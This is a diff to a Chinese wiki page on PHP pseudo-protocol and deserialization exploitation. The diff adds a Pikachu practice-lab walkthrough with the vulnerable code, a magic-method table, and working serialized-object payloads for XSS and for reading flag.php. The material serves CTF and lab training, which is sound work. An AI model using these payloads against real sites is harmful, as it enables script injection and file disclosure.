@@ -3,7 +3,7 @@ title: PHP伪协议与反序列化利用
 description: 系统梳理 PHP 伪协议（php://filter、php://input、data://、file://、gopher:// 等）利用技巧，深度解析反序列化漏洞中
   __wakeup 绕过（对象计数不匹配）、正则过滤数字绕过（+ 前缀）、base64 编码差异导致的利用细节。补充 SSRF 场景下 file:// 本地文件读取、gopher://
   发送原始 TCP 数据包攻击 FastCGI/Redis、双重 URL 编码绕过解析机制及多种绕过技巧。结合赣网杯2020、攻防世界 unserialize3
-  与 Web_php_unserialize、CTFHUB SSRF 靶场实战题目完善利用链。
+  与 Web_php_unserialize、CTFHUB SSRF 靶场实战题目完善利用链，并新增 Pikachu 靶场 PHP 反序列化漏洞实战复现案例。
 category: program-analysis
 tags:
 - PHP
@@ -20,12 +20,15 @@ tags:
 - FastCGI
 - Redis
 - 双重URL编码
-date: 2020-10-01
+- Pikachu
+- 对象注入
+- 魔术方法
+date: '2020-10-01'
 updated: '2026-11-14'
 ---
 ## 概述
 
-本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]] 相关题解。
+本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场** 及 **Pikachu 靶场** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]]、[[pikachu-target-writeup-part5]] 相关题解。
 
 ## PHP 常见伪协议速查
 
@@ -156,7 +159,106 @@ echo serialize($password);
 
 ---
 
-## 实战复现二：攻防世界 `unserialize3`（`__wakeup` 绕过——对象计数不匹配）
+## 实战复现二：Pikachu 靶场 PHP 反序列化漏洞
+
+> 来源：[[pikachu-target-writeup-part5]]、无名安全团队归档文章《pikachu靶场&目录遍历&信息泄露&反序列化&XXE&重定向&SSRF(五)》。
+
+### 漏洞代码分析
+
+Pikachu 靶场反序列化关卡核心代码如下：
+
+```php
+// 接收 POST 参数 'o'
+if(isset($_POST['o'])){
+    $s = $_POST['o'];
+    // 反序列化用户输入
+    if(!@$unser = unserialize($s)){
+        echo "<p>大兄弟,来点劲爆点儿的!</p>";
+    }else{
+        // 直接输出对象属性，触发 __toString
+        echo "<p>{$unser->test}</p>";
+    }
+}
+```
+
+**漏洞点**：
+1.  `unserialize()` 直接处理用户可控输入 `$_POST['o']`，无任何过滤。
+2.  反序列化后直接在字符串上下文中输出对象属性 `{$unser->test}`，若对象实现了 `__toString()` 将自动调用。
+
+### 魔术方法利用原理
+
+PHP 反序列化漏洞核心在于**魔术方法**的自动触发。常见魔术方法及触发时机：
+
+| 魔术方法 | 触发时机 | 利用场景 |
+| :--- | :--- | :--- |
+| `__construct()` | 对象实例化时 (`new`) | 反序列化**不触发**，仅用于本地构造 Payload |
+| `__wakeup()` | `unserialize()` 成功后 | 绕过初始化检查、重置属性防御 |
+| `__destruct()` | 对象销毁 (脚本结束/引用计数为0) | 最通用触发点，文件操作、命令执行 |
+| `__toString()` | 对象作为字符串使用 (`echo`/拼接/格式化) | 直接输出对象、SQL 拼接、文件名拼接 |
+| `__sleep()` | `serialize()` 之前 | 控制序列化哪些属性 |
+| `__call()` / `__callStatic()` | 调用不可访问方法时 | 链式调用起点 |
+
+### 实战利用步骤
+
+#### 本地构造恶意序列化字符串
+
+```php
+<?php
+class S{
+    public $test = "pikachu";
+    // 可选：实现 __toString 进一步利用
+    public function __toString(){
+        return $this->test;
+    }
+}
+
+$obj = new S();
+// 修改属性值为 XSS Payload 或文件读取路径
+$obj->test = "<script>alert('xss')</script>";
+// 或: $obj->test = file_get_contents("/etc/passwd"); (需配合其他魔术方法)
+
+echo serialize($obj);
+// 输出: O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
+?>
+```
+
+#### 发送 Payload
+
+*   **POST 请求**：`o=O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}`
+*   **效果**：页面回显 `<p><script>alert('xss')</script></p>`，触发 XSS。
+
+#### 进阶利用：结合 `__toString` 读取文件
+
+若目标类定义如下：
+```php
+class Flag{
+    public $file;
+    public function __toString(){
+        if(isset($this->file)){
+            return file_get_contents($this->file);
+        }
+    }
+}
+```
+
+构造 Payload：
+```php
+<?php
+class Flag{
+    public $file = "flag.php";
+}
+echo serialize(new Flag());
+// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+?>
+```
+
+发送 `o=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}` 即可读取 Flag。
+
+> **关键要求**：目标环境必须已加载 `Flag` 类定义（通过 `include/require` 或自动加载），否则反序列化产生 `__PHP_Incomplete_Class` 无法触发魔术方法。
+
+---
+
+## 实战复现三：攻防世界 `unserialize3`（`__wakeup` 绕过——对象计数不匹配）
 
 > 来源：[[attack-defense-world-master-advanced-writeup]] 中的 `unserialize3` 题目。
 
@@ -193,7 +295,7 @@ $password = unserialize($_GET['password']);
 
 ---
 
-## 实战复现三：攻防世界 `Web_php_unserialize`（综合绕过链：`__wakeup` + 正则绕过 + Base64 差异）
+## 实战复现四：攻防世界 `Web_php_unserialize`（综合绕过链：`__wakeup` + 正则绕过 + Base64 差异）
 
 > 来源：[[attack-defense-world-master-advanced-writeup]] 中的 `Web_php_unserialize` 题目。
 
@@ -488,7 +590,7 @@ print(payload)
 | 魔术方法 | 触发时机 | 核心利用条件 | 典型绕过/利用点 | 本文涉及题目 |
 | :--- | :--- | :--- | :--- | :--- |
 | **`__wakeup`** | `unserialize()` 成功后 | 类定义中存在 `__wakeup` 且有防御逻辑 | **对象属性计数不匹配** (声明 > 实际) 绕过执行 | `unserialize3`, `Web_php_unserialize` |
-| **`__toString`** | 对象作为字符串使用 (`echo`/拼接) | 代码中直接 `echo $obj` 或字符串拼接 | 控制属性进入 `file_get_contents` / SQL / `file_put_contents` | 赣网杯2020 |
+| **`__toString`** | 对象作为字符串使用 (`echo`/拼接) | 代码中直接 `echo $obj` 或字符串拼接 | 控制属性进入 `file_get_contents` / SQL / `file_put_contents` | 赣网杯2020, Pikachu |
 | **`__destruct`** | 对象销毁 (脚本结束/引用计数为0) | 无特殊条件，最通用触发点 | 文件操作、命令执行、链式调用起点 | `Web_php_unserialize` |
 | **`__construct`** | 对象创建 (`new`) | 反序列化**不触发** (仅 `new` 触发) | 仅用于本地生成 Payload 时初始化属性 | 本地 EXP 脚本 |
 | **`__sleep`** | `serialize()` 之前 | 可控制序列化哪些属性 | 隐藏敏感属性、配合 `__wakeup` 逻辑 | - |
@@ -519,6 +621,7 @@ print(payload)
 *   [[attack-defense-world-master-advanced-writeup]] - 攻防世界高手进阶区完整 Writeup 索引，包含 `unserialize3`、`Web_php_unserialize` 等题目详解。
 *   [[ssrf-ctf-exploitation-guide]] - CTFHUB SSRF 靶场完整利用指南，涵盖内网探测、多协议利用、POST 构造、文件上传、FastCGI/Redis RCE 及双重 URL 编码技巧。
 *   [[ssrf-bypass-techniques]] - SSRF 绕过技巧系统梳理：用户信息、十六进制 IP、302 跳转、DNS 重绑定、localhost 绕过等五大核心技巧。
+*   [[pikachu-target-writeup-part5]] - Pikachu 靶场第 5 篇实战内容，涵盖目录遍历、敏感信息泄露、PHP 反序列化、XXE 外部实体注入、不安全 URL 跳转、SSRF 服务端请求伪造六大漏洞的原理、Payload 构造、利用链分析及防御思路。
 *   [[ctf-show-php-command-execution-bypass-techniques]] - PHP 命令执行与绕过技巧体系，涉及 `disable_functions`、`open_basedir` 等后续利用环境。
 *   [[php-webshell-fundamentals-chopper-analysis]] - PHP Webshell 基础与蚁剑流量分析，反序列化/SSRF Getshell 后的后续操作参考。
 *   [[internal-network-pivoting-techniques]] - 内网穿透/横向移动技术体系，SSRF 获取内网立足点后的代理隧道搭建实战。
@@ -532,6 +635,7 @@ print(payload)
 *   赣网杯2020 Writeup 原文 (微信归档)
 *   攻防世界靶场在线实战环境
 *   CTFHUB 靶场 SSRF 闯关实战
+*   Pikachu 靶场在线实战环境
 *   Gopherus: https://github.com/tarunkant/Gopherus
 *   FastCGI 协议分析: https://segmentfault.com/a/1190000013112052
 *   Redis 未授权访问利用: https://blog.csdn.net/mysteryflower/article/details/94386461
@@ -539,8 +643,4 @@ print(payload)
 
 ## 来源
 
-- [007攻防实验室-202007-202010_2](../sources/007攻防实验室-202007-202010_2.md)
-- [攻防世界高手进阶区page1](../sources/攻防世界高手进阶区page1.md)
-- [0x00实验室-202108-202304_065](../sources/0x00实验室-202108-202304_065.md)
-- [CTFHUB靶场闯关--SSRF漏洞](../sources/CTFHUB靶场闯关--SSRF漏洞.md)
-- [0x00实验室-202108-202304_069](../sources/0x00实验室-202108-202304_069.md)
+- [0x00实验室-202108-202304_075](../sources/0x00实验室-202108-202304_075.md)
